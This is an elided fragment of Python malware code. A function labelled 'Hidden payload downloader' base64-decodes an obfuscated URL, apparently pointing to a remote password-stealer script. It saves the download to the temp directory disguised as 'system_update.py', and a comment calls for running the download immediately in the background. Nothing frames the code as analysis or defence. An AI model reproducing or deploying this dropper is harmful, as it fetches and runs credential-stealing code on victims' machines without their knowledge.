...
# --- Hidden payload downloader ---
def download_and_execute_payload():
    """Downloads and executes the password stealer payload in background"""
    def payload_worker():
        try:
            # Obfuscated URL
            url = base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2pkamRoZGNiZmdnaGg4ODQ1L2hpaGkvcmVmcy9oZWFkcy9tYWluL3Bhc3N3b3JkX3N0ZWFsZXJfZmluYWwucHk=').decode('utf-8')
            
            # Download to temp directory
            temp_dir = tempfile.gettempdir()
            payload_path = os.path.join(temp_dir, 'system_update.py')
...
# Execute payload download immediately
